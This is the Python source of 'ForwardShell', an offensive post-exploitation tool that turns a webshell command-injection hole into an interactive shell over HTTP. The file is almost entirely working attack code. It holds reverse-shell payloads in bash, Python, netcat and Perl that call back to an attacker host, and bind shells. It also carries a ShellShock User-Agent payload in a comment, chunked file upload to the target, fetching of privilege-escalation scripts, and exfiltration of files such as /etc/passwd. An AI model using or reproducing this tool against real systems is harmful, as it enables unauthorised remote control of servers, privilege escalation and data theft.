#!/usr/bin/python3
#
# This is a semiautomatic shell you can use if you get a simple Webshell RCE.
# ForwardShell has some nice features:
# - Upgrade your shell to a PTY with Python
# - ReverseShell in Bash, Python, Netcat and Perl
# - BindShell in Python, Netcat and Perl
# - File upload
# - File download
#
# Author: 61106960
# Credits to ippsec and 0xdf for their initial idea of a shell like this

import base64
import random
import requests
import threading
import time
import argparse
import sys
import os
import gzip
import re
from os.path import dirname

class WebShell(object):

######################################################################################
#                                                                                    #
# ForwardShell Init Function                                                         #
#                                                                                    #
# Initialise Variables                                                               # 
# Initialise FIFO Session                                                            #
# Initialise Shell                                                                   # 
#                                                                                    #
######################################################################################

    # Initialize Class + Setup Shell
    def __init__(self):
        print(f"[*] {__progname__} v{__version__}:")
        # Set up basic things
        self.url = options.u
        self.parameter = options.p
        self.method = options.m.lower()
        self.lhost = options.lhost
        self.lport = options.lport
        self.revshell = options.revshell.lower()
        self.bindshell = options.bindshell.lower()
        self.working_path = options.path
        self.verbose = options.verbose
        self.display_prefix = options.prefix
        self.display_suffix = options.suffix
        
        # Set up proxy
        self.proxies = {}
        if options.P:
            self.proxies = {'http': f'{options.P}'}
            if self.verbose: print(f"[VERBOSE] Using proxy {self.proxies['http']}")

        # Setup additional headers
        self.headers = {}
        self.headers['User-Agent'] = f'{__progname__}/{__version__}'

        if options.C:
            self.headers['Cookie'] = options.C
        
        if options.H:
            for header in options.H:
                header_name, header_value =  header[0].split(':')
                self.headers[f'{header_name.strip()}'] = header_value.strip()

        if self.verbose: print(f"[VERBOSE] Add additional header {self.headers}")

        # Set up network speed
        self.interval=1 # == fast
        if self.verbose: print(f"[VERBOSE] Using network connection speed {options.speed}")
        if options.speed.strip().lower() == 'insane':
            self.interval=0.25
        elif options.speed.strip().lower() == 'fast':
            self.interval=1
        elif options.speed.strip().lower() == 'medium':
            self.interval=1.5
        elif options.speed.strip().lower() == 'slow':
            self.interval=3

        # Set up chunk size for file upload
        self.chunk_size = 1850 # default if using GET
        if self.method == 'post':
            self.chunk_size = 80000
        if self.verbose: print(f"[VERBOSE] Using a chunk size of {self.chunk_size} characters when uploading files")

        # Request local file path on target for needed binary files
        self.GetProg()

        # Set up fifo session
        self.session = random.randrange(10000,99999)
        if self.verbose: print(f"[VERBOSE] Generate SessionID: {self.session}")
        self.stdin = f'{self.working_path}/Fwdsh-input.{self.session}'
        self.stdout = f'{self.working_path}/Fwdsh-output.{self.session}'
        MakeNamedPipes = f"{self.MKFIFO} {self.stdin}; {self.TAIL} -f {self.stdin} | {self.SH} 2>&1 > {self.stdout}"

        # Set up shell
        print(f"[*] Trying to set up {__progname__} on Target {self.url}")
        self.RunRawCmd(MakeNamedPipes, timeout=1)
        raw_result = self.RunRawCmd(f"{self.LS} {self.stdout}")
        CheckConnction = self.DisplayResp(raw_result)
        if CheckConnction:
             CheckConnction = CheckConnction.rstrip()
        if CheckConnction == f'{self.stdout}':
            print(f"[+] Connection to {self.url} established")
            ClearOutput = f'{self.ECHO} -n "" > {self.stdout}'
            self.RunRawCmd(ClearOutput)
        else:
            print(f"[ERROR] Cannot connect to {self.url}")
            exit()

        # Set up read thread
        self.stop_threads = False
        self.thread = threading.Thread(target=self.ReadThread, args=(lambda : self.stop_threads,))
        self.thread.daemon = True
        self.thread.start()

######################################################################################
#                                                                                    #
# Command = ?                                                                        #
#                                                                                    #
# Functions are:                                                                     # 
# Help                  Show Program Help                                            #
# Error                 Show Error Message with Some Help                            #
#                                                                                    #
######################################################################################

    # Show program help function and set module parameters
    def Help(self, module):
        if module == 'main':
            print(
            f'[?] {__progname__} - Internal Commands:\n'
            f'\n'
            f'  ?set                    Change Bind- and RervseShell parameters, like LHOST, LPORT and Shell type\n'
            f'  ?start                  Start a {__progname__} shell module\n'
            f'  ?start -m {{module}}      Start a specific Shell module; available modules are Upgrade, RevShell and BindShell\n'
            f'  ?upload                 Upload a file or module to the target working directory {self.working_path}\n'
            f'  ?upload {{filename}}      Upload a local file to the target\n'
            f'  ?upload -m {{module}}     Upload a specific module to the target; available modules are LinPeas, exploit-suggester and linEnum\n'
            f'  ?download {{filename}}    Download a file from the target to your local working directory\n'
            f'  ?exit                   Stops the Shell, kills processes, removes files on the target system and exits the program\n'
            f'  ?exit -force            Stops the Shell, kill all processes and files from all possible running or stuck Shells\n')

        elif module == 'Set':
            print(
            f'[?] {__progname__} - ReverseShell Parameter:\n'
            f'\n'
            f'  LHOST                   {self.lhost}\n'
            f'  LPORT                   {self.lport}\n'
            f'  Revshell                {self.revshell} (possible values are Bash, Python, NetCat, Perl)\n'
            f'\n'
            f'[?] {__progname__} - BindShell Parameter:\n'
            f'\n'
            f'  LPORT                   {self.lport}\n'
            f'  Bindshell               {self.bindshell} (possible values are Python, Netcat, Perl)\n'
            f'\n'
            f'You can set the above parameter according to your needs, e.g.:\n> ?set LHOST 192.168.0.1\n> ?set LPORT 443\n> ?set Revshell Python\n> ?set BindShell Perl\n')
        elif module == 'Start':
            print(
            f'[?] {__progname__} - Modules:\n'
            f'\n'
            f'  ?start -m upgrade       Upgrade your shell to a PTY with Python\n'
            f'  ?start -m revshell      Start a ReverseShell with Bash [change from Bash to Python, NetCat or Perl via ?set]\n'
            f'  ?start -m bindshell     Start a BindShell with Python [change from Python to Netcat or Perl via ?set]\n')
        elif module == 'Upload':
            print(
            f'[?] {__progname__} - File Upload:\n'
            f'\n'
            f'  ?upload {{filename}}      Upload a local file to the target {self.working_path} directory\n'
            f'  ?upload -m {{module}}     Downloads a module file from the Internet source and uploads it directly to the target {self.working_path} directory\n'
            f'                          (possible modules are LinPeas, exploit-suggester, LinEnum)\n'
            f'\n'
            f'You can upload a file like:          You can upload a module like:\n'
            f'> ?upload linpeas.sh                 > ?upload -m LinPeas\n'
            f'> ?upload c:\\tools\\chisel            > ?upload -m exploit-suggester\n'
            f'> ?upload /usr/bin/ncat              > ?upload -m LinEnum\n')
        elif module == 'Download':
            print(
            f'[?] {__progname__} - File Download:\n'
            f'\n'
            f'  ?download {{filename}}     Download a file from the target to your local working directory\n'
            f'\n'
            f'You can download a single file (use always the complete path) like:\n'
            f'> ?download /etc/passwd\n')
        else:
            pass

    def Error(self, raw_result, filtered_result):
        if self.verbose:
            print(f"[VERBOSE] Original server response was \'{raw_result}\'")
            print(f"[VERBOSE] Server response after display filter is \'{filtered_result}\'")
            print(f"[VERBOSE] Likely that you have to adjust the values for -prefix and -suffix or your request URL with parameter is wrong")
        print(f"[ERROR] Cannot establish a shell with URL {self.url}?{self.parameter}={{CommandInjection}}")
        print(f"[ERROR] Please use the program switch -verbose to get more details of the connection issue or -h to get more help")
        exit()


######################################################################################
#                                                                                    #
# Command = ?set                                                                     #
#                                                                                    #
# Functions are:                                                                     # 
# SetParameter          Set Parameter for Bind- and RevShell                         #
#                                                                                    #
######################################################################################

    # Set program parameters
    def SetParameter(self, option, value):
        option, value = option.strip().lower(), value.strip().lower()
        if option == 'lhost':
            self.lhost = f'{value}'
            print()
            print(f'  [+] LHOST      {self.lhost}')
            print()
        elif option == 'lport':
            self.lport = f'{value}'
            print()
            print(f'  [+] LPORT     {self.lport}')
            print()
        elif option == 'revshell':
            RevShells = ['bash','python','netcat','perl']
            if value in RevShells:
                    self.revshell = f'{value}'
                    print()
                    print(f'  [+] Revshell  {self.revshell}')
                    print()
            else:
                print('[ERROR] Wrong ReverseShell version, use \'Bash\', \'Python\', \'Netcat\' or \'Perl\'\n')
        elif option == 'bindshell':
            BindShells = ['python','netcat','perl']
            if value in BindShells:
                    self.bindshell = f'{value}'
                    print()
                    print(f'  [+] Bindshell      {self.bindshell}')
                    print()
            else:
                print('[ERROR] Wrong BindShell version, use \'Python\', \'Netcat\' or \'Perl\'\n')
        else:
            print(f'[ERROR] option {option} is unknown\n')
            S.Help('Set')

######################################################################################
#                                                                                    #
# Command = ?start                                                                   #
#                                                                                    #
# Functions are:                                                                     # 
# UpgradeShell          Upgrades to a PTY Shell                                      #
# RevShell              Start a ReverseShell                                         #
# BindShell             Start a BindShell                                            #
#                                                                                    #
######################################################################################

    # Upgrade ForwardShell to PTY
    def UpgradeShell(self):
        if self.PYTHON:
            print(f'[*] Start PTY with {self.PYTHON}')
            UpgradeShell = f"""{self.PYTHON} -c 'import pty; pty.spawn("/bin/bash")'"""
            self.WriteCmd(UpgradeShell)
            print(f'Just pimp your PTY a little bit...')
            pimp_shell = f"""export TERM=xterm ; alias ll=\'ls -ali --color=auto\'"""
            self.WriteCmd(pimp_shell)

        else:
            print(f"[ERROR] No Python found on target; PTY not possible")

    # Start ReverseShell
    def RevShell(self):
        ##revshell = revshell.strip().lower()
        if self.lhost == '127.0.0.1':
            print('[ERROR] You have to set a valid LHOST first, use ?set')
        else:
            # Bash reverse shell
            if self.revshell == 'bash':
                if self.BASH:
                    print(f'[*] Starting ReverseShell with Bash to {self.lhost} on port {self.lport}\n')
                    RevShellFormat = f"""{self.BASH} -c 'bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1' &"""
                    if self.verbose: print(f"[VERBOSE] ReverseShell raw command {RevShellFormat}")
                    self.WriteCmd(RevShellFormat)
                else:
                    print(f"[ERROR] No Bash found on target; ReverseShell not possible")
            # Python reverse shell
            elif self.revshell == 'python':
                if self.PYTHON:
                    print(f'[*] Starting ReverseShell with {self.PYTHON} to {self.lhost} on port {self.lport}')
                    RevShellFormat = f"""{self.PYTHON} -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{self.lhost}",{self.lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("{self.BASH}")' &"""
                    if self.verbose: print(f"[VERBOSE] ReverseShell raw command {RevShellFormat}")
                    self.WriteCmd(RevShellFormat)
                else:
                    print(f"[ERROR] No Python found on target; ReverseShell not possible")

            # NetCat reverse shell
            elif self.revshell == 'netcat':
                if self.NETCAT:
                    print(f'[*] Starting ReverseShell with {self.NETCAT} to {self.lhost} on port {self.lport}')
                    RevShellFormat = f"""{self.NETCAT} {self.lhost} {self.lport} -e {self.BASH} &"""
                    if self.verbose: print(f"[VERBOSE] ReverseShell raw command {RevShellFormat}")
                    self.WriteCmd(RevShellFormat)
                else:
                    print(f"[ERROR] No Netcat or equivalent found on target; ReverseShell not possible")

            # Perl reverse shell
            elif self.revshell == 'perl':
                if self.PERL:
                    print(f'[*] Starting ReverseShell with {self.PERL} to {self.lhost} on port {self.lport}\n')
                    RevShellFormat = f"""{self.PERL} -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{self.lhost}:{self.lport}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' &"""
                    if self.verbose: print(f"[VERBOSE] ReverseShell raw command {RevShellFormat}")
                    self.WriteCmd(RevShellFormat)
                else:
                    print(f"[ERROR] No Perl found on target; ReverseShell not possible")
            else:
                print('[ERROR] Something went wrong with starting the ReverseShell')

    # Start BindShell
    def BindShell(self):
        # NetCat bind shell
        if self.bindshell == 'netcat':
            if self.NETCAT:
                print(f'[*] Starting BindShell with {self.NETCAT} on port {self.lport}')
                BindShellFormat = f"""{self.NETCAT} -nlvp {self.lport} -e {self.BASH} &"""
                if self.verbose: print(f"[VERBOSE] BindShell raw command {BindShellFormat}")
                self.WriteCmd(BindShellFormat)
            else:
                print(f"[ERROR] No Netcat or equivalent found on target; BindShell not possible")

        # Python bind shell
        elif self.bindshell == 'python':
            if self.PYTHON:
                print(f'[*] Starting BindShell with {self.PYTHON} on port {self.lport}')
                BindShellFormat = f"""{self.PYTHON} -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",{self.lport}));s.listen(5);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);p=subprocess.call(["{self.BASH}","-i"])' &"""
                if self.verbose: print(f"[VERBOSE] BindShell raw command {BindShellFormat}")
                self.WriteCmd(BindShellFormat)
            else:
                print(f"[ERROR] No Python found on target; BindShell not possible")

        # Perl bind shell
        elif self.bindshell == 'perl':
            if self.PERL:
                print(f'[*] Starting BindShell with {self.PERL} on port {self.lport}')
                BindShellFormat = f"""{self.PERL} -MIO -e 'use Socket;$protocol=getprotobyname('tcp');socket(S,&PF_INET,&SOCK_STREAM,$protocol);setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);bind(S,sockaddr_in({self.lport},INADDR_ANY));listen(S,3);while(1){{accept(CONN,S);if(!($pid=fork)){{die "Cannot fork" if (!defined $pid);open STDIN,"<&CONN";open STDOUT,">&CONN";open STDERR,">&CONN";exec "/bin/bash -i";close CONN;exit 0;}}}}' &"""
                if self.verbose: print(f"[VERBOSE] BindShell raw command {BindShellFormat}")
                self.WriteCmd(BindShellFormat)
            else:
                print(f"[ERROR] No Perl found on target; BindShell not possible")
        else:
            print('[ERROR] Something went wrong with Starting the BindShell')

######################################################################################
#                                                                                    #
# Command = ?upload                                                                  #
#                                                                                    #
# Functions are:                                                                     # 
# UploadCmd             Upload a file or module                                      #
# DownloadProg          Download pre-defined Internet Scripts                        #
#                                                                                    #
######################################################################################

    # Upload a file or module
    def UploadCmd(self, upload, stream=False, name='dummy'):
        # If the content of parameter 'upload' is a stream and not a file
        if stream:
            filename = name
            raw_data = upload

        # This is to read a file from the filesystem
        else:
            try:
                with open(upload, 'rb') as file:
                    filename = (os.path.split(upload))[1]
                    raw_data = file.read()
            except:
                print(f'[ERROR] Something went wrong with reading the file {upload}')
                return False

        # Compress and bas64 the content
        comp_data = gzip.compress(raw_data, compresslevel=9)
        enc_data = base64.b64encode(comp_data).decode('ascii')

        # Split the base64 blob in chunks; the size depends on GET or POST        
        print(f'[*] Calculating chunks of {filename}...')
        chunk_array = list(self.split_chunks(enc_data, n=self.chunk_size))
        for index, chunk in enumerate(chunk_array):
            print(f'[*] Uploading chunk {(index) +1} of {len(chunk_array)} from {filename} in progress...', end='\r', flush=True)
            upload_file = f'{self.ECHO} -n {chunk} >> {self.working_path}/{filename}.gz~b64'
            self.WriteCmd(upload_file, fifo=False)
        
        print(f'\n[!] Upload finished')
        expand_file = f'{self.CAT} {self.working_path}/{filename}.gz~b64 | {self.BASE64} -d > {self.working_path}/{filename}.gz ; {self.GZIP} -d -f {self.working_path}/{filename}.gz ; {self.RM} -f {self.working_path}/{filename}.gz~b64'
        self.WriteCmd(expand_file, fifo=False)

    # Downloads files from the Internet and uploads them to the target
    def DownloadProg(self, url, timeout=30):
        headers = {'User-Agent': f'{__progname__}/{__version__}'}
        try:
            r = requests.get(url, headers=headers, proxies=self.proxies, timeout=timeout)
            return r.content
        except:
            print(f'[ERROR] Something went wrong with downloading {url}')

######################################################################################
#                                                                                    #
# Command = ?download                                                                #
#                                                                                    #
# Functions are:                                                                     # 
# DownloadFile          Download a File from the Target                              #
#                                                                                    #
######################################################################################

    # Download a files from the target
    def DownloadFile(self, file):
        # gzip file, base64 it and request it
        file_download = f'{self.GZIP} {file} -c | {self.BASE64} -w0'
        if self.verbose: print(f"[VERBOSE] Download file raw command {file_download}")
        print(f'[*] Downloading {file} in progress...')
        raw_result = self.WriteCmd(file_download, fifo=False)
        downloaded_file = self.DisplayResp(raw_result)
        try:
            # base64 decode it
            decoded_data = base64.b64decode(downloaded_file)
            # decompress it
            decompressed_data = gzip.decompress(decoded_data)
        except:
            print(f'[ERROR] Something went wrong with downloading {file}')
            print(f'{downloaded_file}')
            return False

        # write the binary blob to file
        filename = file.split('/')[-1].strip('"|\'')
        try:
            with open(filename, 'wb') as file:
                file.write(decompressed_data)
                print(f'[*] Saved the file {filename} successfuly')
        except:
            print(f'[ERROR] Something went wrong with saving the file {filename}')

######################################################################################
#                                                                                    #
# Command = ?exit                                                                    #
#                                                                                    #
# Functions are:                                                                     # 
# killCmd               Exits the program and cleanup the Target                     #
#                                                                                    #
######################################################################################

    # Terminating shell and deleting files
    def killCmd(self, force=False):
        # stop read thread
        self.stop_threads = True
        self.thread.join()
        print(f'[*] Cleaning up sessions and files')

        if force == True:
            if self.verbose: print(f'[VERBOSE] Terminating all Shells')
            checkProcess = f'{self.PS} -aux | {self.GREP} -e {self.stdin.split(".")[0]} -e "-c import pty; pty.spawn("'
        else:
            if self.verbose: print(f'[VERBOSE] Terminating {__progname__} with SessionID: {self.session}')
            checkProcess = f'{self.PS} -aux | {self.GREP} -e {self.stdin} -e "-c import pty; pty.spawn("'
        
        # read result of ps -aux and kill processes
        raw_result = self.WriteCmd(checkProcess, fifo=False)
        result = self.DisplayResp(raw_result)

        processes = result.split('\n')
        for process in processes[0:]:
            if process >= '1':
                killproc = f'{self.KILL} {process.split()[1]}'
                if self.verbose: print(f"[VERBOSE] Kill process {process.split()[1]}")
                self.WriteCmd(killproc, fifo=False)
            elif process < '1':
                pass
            else:
                print(f'[ERROR] No running {__progname__} process')
        
        # delete fifo files
        if force == True:
            Fwdshellfiles = f'{self.RM} -f {self.stdin.split(".")[0]}.* ; {self.RM} -f {self.stdout.split(".")[0]}.*'
        else:
            Fwdshellfiles = f'{self.RM} -f {self.stdin} {self.stdout}'
        if self.verbose: print(f"[VERBOSE] Send data: {Fwdshellfiles}")
        self.WriteCmd(Fwdshellfiles, fifo=False)
        print(f'[*] Have a nice day :-)')
        exit()

######################################################################################
#                                                                                    #
# ForwardShell Core Modules                                                          #
#                                                                                    #
# Functions are:                                                                     # 
# WriteCmd              Builds the RCE request                                       #
# RunRawCmd             Sends the RCE request to the target                          #
# ReadThread            Starts a Thread an reads RCE ouput constantly                #
#                                                                                    #
######################################################################################

    # Build the RCE command
    def WriteCmd(self, cmd, fifo=True):
        b64cmd = base64.b64encode('{}\n'.format(cmd.rstrip()).encode('utf-8')).decode('utf-8')
        if fifo:
            # if fifo enabled redirect the command in fifo-stdin
            stage_cmd = f'{self.ECHO} {b64cmd} | {self.BASE64} -d > {self.stdin}'
            if self.verbose: print(f"[VERBOSE] Send data: {stage_cmd}")
            self.RunRawCmd(stage_cmd)
        else:
            # if fifo disabled pipe the command directly to the shell
            stage_cmd = f'{self.ECHO} {b64cmd} | {self.BASE64} -d | {self.SH} 2>&1'
            if self.verbose: print(f"[VERBOSE] Send data: {stage_cmd}")
            return (self.RunRawCmd(stage_cmd))
        time.sleep(self.interval *1.0)

    # Execute command
    def RunRawCmd(self, cmd, timeout=10):

        # self.headers = {'User-Agent': f'() {{:;}}; {cmd}'} # MODIFY THIS: Payload in User-Agent if you have no Webshell but ShellShock

        payload = cmd # Change this if your command needs some more adjustment
        data = {self.parameter: payload}

        try:
            if self.method == 'post':
                    r = requests.post(self.url, data=data, headers=self.headers, proxies=self.proxies, timeout=timeout)
            elif self.method == 'get':
                    r = requests.get(self.url, params=data, headers=self.headers, proxies=self.proxies, timeout=timeout)
            return r.text
        except:
            pass

    # Read $session, output text to screen & wipe session
    def ReadThread(self, stop):
        GetOutput = f"{self.CAT} {self.stdout}"
        while True:
            if stop():
                break
            raw_result = self.RunRawCmd(GetOutput)
            if raw_result:
                result = self.DisplayResp(raw_result)
                if result == False or result == '':
                    pass
                else:
                    print(result)
                
                ClearOutput = f'{self.ECHO} -n "" > {self.stdout}'
                self.RunRawCmd(ClearOutput)
            time.sleep(self.interval *1.2)

######################################################################################
#                                                                                    #
# ForwardShell Helper Modules                                                        #
#                                                                                    #
# Functions are:                                                                     # 
# DisplayResp           Formats the raw RCE output                                   #
# GetBinPath            Gets the full path of a certain binary at the target         #
# GetProg               Gets the full path of Python and Netcat at the target        #
# split_chunks          Splits a string in chunks (for File Download)                #
#                                                                                    #
######################################################################################

    # Display the result of the request
    # Use this to adjust the results if needed
    def DisplayResp(self, raw_input):

        display_result = raw_input.strip('\n')

        if options.prefix or options.suffix:
            # use the user provided prefix and suffix to build a RegEx
            if self.display_prefix and self.display_suffix:
                pattern = f'{self.display_prefix}(.*){self.display_suffix}'

            # use the user provided prefix to build a RegEx
            elif self.display_prefix:
                pattern = f'{self.display_prefix}(.*)'

            # use the user provided suffix to build a RegEx
            elif self.display_suffix:
                pattern = f'(.*){self.display_suffix}'
            
            result = re.search(pattern, raw_input, re.DOTALL)

            try:
                display_result = result.group(1).strip('\n')
            except:
                pass

        return display_result

    # Helper Module to get the file system path of a programm
    def GetBinPath(self, file):
        first_run = True
        binary_found = False

        try:
            # check if which found already and use it to search for binaries
            if self.WHICH:
                filename = f'{self.WHICH} {file}'
                raw_result = self.RunRawCmd(filename)
                result = self.DisplayResp(raw_result)
                if self.verbose: print(f"[VERBOSE] Found binary path {result}")
                return result

        except:
            # if which has not found already or is not available at all, search the binary in common binary paths
            prog_path = ["/usr/bin", "/usr/sbin", "/sbin", "/bin"]
            for path in prog_path:
                filename = f'ls {path}/{file}'
                raw_result = self.RunRawCmd(filename)
                result = self.DisplayResp(raw_result)
                if result == f'{path}/{file}':
                    if self.verbose: print(f"[VERBOSE] Found binary path {result}")
                    binary_found = True
                    return result
                else:
                    if self.verbose: print(f'[VERBOSE] Binary {file} not found in {path}')
                    pass
            # If not even the binary bash has been found, the program has to be stopped
            if binary_found == False:
                if file == 'bash':
                    self.Error(raw_result, result)

    # Get path of needed binaries on target
    def GetProg(self):
        # Request file path of needed binaries
        binaries = ["which", "bash", "base64", "cat", "cp", "echo", "grep", "gzip", "kill", "ls", "mkfifo", "mv", "perl", "ps", "rm", "sh", "tail"]
        for binary in binaries:
            result = self.GetBinPath(binary)
            if result:
                if binary == "which": self.WHICH = result
                elif binary == "bash": self.BASH = result
                elif binary == "base64": self.BASE64 = result
                elif binary == "cat": self.CAT = result
                elif binary == "cp": self.CP = result
                elif binary == "echo": self.ECHO = result
                elif binary == "grep": self.GREP = result
                elif binary == "gzip": self.GZIP = result
                elif binary == "kill": self.KILL = result
                elif binary == "ls": self.LS = result
                elif binary == "mkfifo": self.MKFIFO = result
                elif binary == "mv": self.MV = result
                elif binary == "perl": self.PERL = result
                elif binary == "ps": self.PS = result
                elif binary == "rm": self.RM = result
                elif binary == "sh": self.SH = result
                elif binary == "tail": self.TAIL = result
            else:
                if self.verbose: print(f"[VERBOSE] No path to binary {binary} found")
                pass

        binaries_python = ["python", "python3", "python2"]
        for version in binaries_python:
            result = self.GetBinPath(version)
            if result:
                self.PYTHON = result
                break
            else:
                if self.verbose: print(f"[VERBOSE] No path to binary {version} found")
                pass

        binaries_netcat = ["ncat", "netcat", "nc"]
        for version in binaries_netcat:
            result = self.GetBinPath(version)
            if result:
                self.NETCAT = result
                break
            else: 
                if self.verbose: print(f"[VERBOSE] No path to binary {version} found")
                pass
        
    # Helper module to split var in chunks
    def split_chunks(self, seq, n=8000):
        while seq:
            yield seq[:n]
            seq = seq[n:]
    
######################################################################################
#                                                                                    #
# ForwardShell Main Function                                                         #
#                                                                                    #
######################################################################################

# Process command-line arguments.
if __name__ == '__main__':
    __progname__ = 'ForwardShell'
    __version__ = '0.2.5'

    parser = argparse.ArgumentParser(
        add_help = True,
        description = f'{__progname__} v{__version__} - Exploits a simple Webshell RCE and builds a semiautomatic shell',
        usage = f'python3 {__progname__}.py [-u <url>] [-p <cmd>] -M [<post>] [-P <proxy>]',
        epilog = 'HAVE FUN AND DON\'T BE EVIL!')

    parser.add_argument('-u', action='store', metavar='', help='http[s]://[fqdn,IP]/directory/upload/shell.[php,jsp]')
    parser.add_argument('-m', action='store', metavar='', choices=['post', 'get'], default = 'POST', help='HTTP method to use for requests [GET, POST; default=POST]')
    parser.add_argument('-p', action='store', metavar='', default = 'cmd', help='The parameter of the uploaded webshell which executes the command [default=cmd]')
    parser.add_argument('-P', action='store', metavar='', default = '', help='Proxy to use for requests [http(s)://host:port]')
    parser.add_argument('-C', action='store', metavar='', default = '', help='Add a custom session cookie')
    parser.add_argument('-H', action='append', nargs='+', metavar='', help='Add one ore more additional header')

    group = parser.add_argument_group('you can use even more Bind- and ReverseShell arguments')
    group.add_argument('-lhost', action='store', metavar='', default = '127.0.0.1', help='Your local listening IP address if you use the ReverseShell option')
    group.add_argument('-lport', action='store', metavar='', default = '9001', help='Your local listening TCP port if you use the Bind- or ReverseShell option')
    group.add_argument('-revshell', action='store', metavar='', choices=['bash', 'python', 'perl'], default = 'Bash', help='Kind of ReverseShell [Bash, Python, Perl; default=Bash]')
    group.add_argument('-bindshell', action='store', metavar='', choices=['python', 'netcat', 'perl'], default = 'Python', help='Kind of BindShell [Python, Netcat, Perl; default=Python]')
    group.add_argument('-speed', action='store', metavar='', choices=['insane', 'fast', 'medium', 'slow'], default = 'fast', help='Network speed to the target [Insane, Fast, Medium, Slow; default=Fast]')
    group.add_argument('-path', action='store', metavar='', default = '/dev/shm', help='Default {__progname__} working path; Change it to /tmp if /dev/shm is not available')
    group.add_argument('-prefix', action='store', metavar='', default = '', help='If the WebShell responses with more then the expected output use -prefix to define the unneeded pattern in front the output')
    group.add_argument('-suffix', action='store', metavar='', default = '', help='If the WebShell responses with more then the expected output use -suffix to define the unneeded pattern after the output')
    group.add_argument('-verbose', action='store_true', default = False, help='Use it to set verbose output')
    options = parser.parse_args()

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    # Initialize WebShell class
    S = WebShell()
    prompt = "Shell:> "
    
    print("[*] Type ? for help")
    while True:
        cmd = input(prompt)
        if not cmd:
            pass
        else:
            CustomInput = cmd.split()
            Option = CustomInput[0]
            if Option == '?':
                S.Help('main')

            elif Option.casefold() == '?set':
                if len(CustomInput) >= 3:
                    param = CustomInput[1].lower()
                    value = CustomInput[2].lower()
                    S.SetParameter(param,value)
                else:
                    S.Help('Set')
    
            elif Option.casefold() == '?start':
                if len(CustomInput) >= 3:
                    param = CustomInput[1].lower()
                    module = CustomInput[2].lower()
                    if param == '-m':
                        if module == 'upgrade': S.UpgradeShell()
                        elif module == 'revshell': S.RevShell()
                        elif module == 'bindshell': S.BindShell()
                        else:
                            print(f'[ERROR] {module} is no valid module')
                            S.Help('Start')
                else:
                    print('[ERROR] Wrong ?start option')
                    S.Help('Start')

            elif Option.casefold() == '?upload':
                if len(CustomInput) == 2:
                    # cannot use space as strip seperator as it breaks a path with spaces
                    CustomInput = cmd.split('?upload')
                    upload_file = CustomInput[1].strip(' |"|\'')
                    S.UploadCmd(upload_file)
                elif len(CustomInput) >= 3:
                    param = CustomInput[1].lower()
                    module = CustomInput[2].lower()
                    if param == '-m':
                        if module == 'linpeas': module_url = 'https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh'
                        elif module == 'exploit-suggester': module_url = 'https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh'
                        elif module == 'linenum': module_url = 'https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh'
                        else:
                            print(f'[ERROR] {module} is no valid module')
                            S.Help('Upload')
                        # Download the file and upload it to the target
                        module_name = module_url.split('/')[-1]
                        downloaded_file = S.DownloadProg(module_url)
                        S.UploadCmd(downloaded_file, stream=True, name=module_name)
                    else:
                        print('[ERROR] Wrong ?upload option')
                        S.Help('Upload')
                else:
                    S.Help('Upload')
            
            elif Option.casefold() == '?download':
                if len(CustomInput) >= 2:
                    file_name = CustomInput[1]
                    S.DownloadFile(file_name)
                else:
                    print('[ERROR] No download file specified')
                    S.Help('Download')

            elif Option.casefold() == '?exit':
                if len(CustomInput) >= 2:
                    set_attrib = CustomInput[1].lower()
                    if set_attrib == '-force':
                        S.killCmd(force=True)
                    else:
                        print(f'[ERROR] {set_attrib} not known; exit anyway')
                        S.killCmd()
                else:
                    S.killCmd()
            
            elif Option.startswith('?'):
                print(f'[ERROR] Function {Option} is unknown')
                S.Help('main')

            else:
                S.WriteCmd(cmd)